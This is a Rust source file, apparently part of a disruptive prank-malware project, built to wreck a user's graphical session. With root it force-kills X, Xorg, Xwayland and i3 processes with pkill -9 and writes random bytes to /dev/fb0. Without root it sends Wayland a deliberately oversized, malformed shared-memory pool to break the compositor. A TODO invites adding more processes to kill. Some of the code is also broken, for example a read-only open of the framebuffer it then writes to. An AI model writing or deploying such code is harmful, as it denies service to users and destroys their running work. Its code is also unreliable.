#![no_main]
#![feature(let_chains)]

use std::ffi::CStr;
use std::io::Write;  
use std::ptr; 
use std::fs::OpenOptions; 
use std::os::unix::io::{AsRawFd, IntoRawFd};
use std::os::raw::c_char;
use std::error::Error;

use rand::{Rng};

use x11::xlib;
use wayland_client::{Display, GlobalManager, Main};
use wayland_client::protocol::wl_shm::WlShm; 

extern "C" { 
    fn get_desktop_server() -> *mut c_char;
}

// Pfff its to light for this project, but why not 

pub fn artifacts_and_kill(root: bool, iterations: i32) -> Result<(), std::io::Error> {
    let procs: [&str; 10] = ["X", "Xwayland", "Xorg", "i3", "i3status", "i3lock", "i3status", "i3lock", "i3status", "i3lock"]; 

    if root == true {

        for i in 0..procs.len() {
            std::process::Command::new("pkill")
            .args(&["-9", procs[i]]) 
            //TODO: Add more process names of the processes you want to kill
            .spawn().unwrap();
        }

        let mut fb = std::fs::File::open("/dev/fb0").unwrap();
        let mut rng = rand::thread_rng();

        for _ in 0..iterations {
            let garbage: Vec<u8> = (0..1024).map(|_| rng.gen()).collect();
            let _ = fb.write(&garbage);
        }

    } else {
        
         unsafe {
            let ptr = get_desktop_server();
            if ptr.is_null() {
                panic!("XDG_SESSION_TYPE not set");
            }
         

         if CStr::from_ptr(ptr).to_str().unwrap() == "wayland" {
            wayland_corrupt_buffer().unwrap();
         } else {
            artifacts_x11();
         }
        }
    }
    Ok(())
}


unsafe fn artifacts_x11() -> xlib::Window {
    let dsp = xlib::XOpenDisplay(ptr::null());
    if dsp.is_null() {
        panic!("Couldnt open XServer conn.");
    }

    let screen = xlib::XDefaultScreen(dsp);
    let root_window = xlib::XRootWindow(dsp, screen);

    let mut xattr: xlib::XSetWindowAttributes = std::mem::zeroed();
    xattr.background_pixel = xlib::XBlackPixel(dsp, screen);

    let win = xlib::XCreateWindow(
        dsp,
        root_window,
        0,      // x
        0,      // y
        100,    // width
        100,    // height
        0,      // border_width
        xlib::CopyFromParent as i32,  // depth
        xlib::InputOutput as u32,     // class
        ptr::null_mut(),              // visual 
        xlib::CWBackPixel as u64,     // value_mask
        &mut xattr                    // attributes
    );

    win
}

fn wayland_corrupt_buffer() -> Result<(), Box<dyn Error>> {
    let display = Display::connect_to_env()?;
    let mut event_queue = display.create_event_queue();
    let attached = display.attach(event_queue.token());

    let globals = GlobalManager::new(&attached);
    event_queue.sync_roundtrip(&mut (), |_, _, _| {})?;

    let shm: Main<WlShm> = globals
        .instantiate_exact::<WlShm>(1)
        .map_err(|_| "wl_shm not available")?;

    let tmp_path = std::env::temp_dir().join(format!("wl_broken_{}.tmp", std::process::id()));
    let mut f = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .truncate(true)
        .open(&tmp_path)?;
    f.set_len(4096)?; 
    let raw_fd = f.into_raw_fd(); 

    let _broken_pool = shm.create_pool(raw_fd, 8192);

    let _ = event_queue.sync_roundtrip(&mut (), |_, _, _| {});

    println!("Broken pool creating request sent to Wayland.");
    Ok(())

}

// ITS HAVE TO MUCH SHITCODE FOR 1 FILE
